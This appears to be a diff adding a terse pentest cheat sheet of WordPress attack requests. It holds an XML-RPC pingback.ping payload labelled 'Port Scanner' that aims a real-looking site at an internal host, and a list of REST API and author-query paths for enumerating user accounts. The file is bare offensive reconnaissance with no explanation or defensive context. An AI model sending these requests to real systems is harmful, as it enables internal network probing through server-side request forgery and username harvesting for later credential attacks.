@@ -1,0 +1,17 @@
+Port Scanner
+
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params><param>
+<value><string>https://jobspotting.pl/</string></value>
+</param><param><value><string>https://landingpage-wp.internal.api.savedroid.com/</string>
+</value></param></params>
+</methodCall>
+
+Users
+
+/wp-json/wp/v2/pages
+/?author=1
+/?rest_route=/wp/v2/users/1
+/wp-json/wp/v2/users/
+/wp-json/wp/v2/users/1
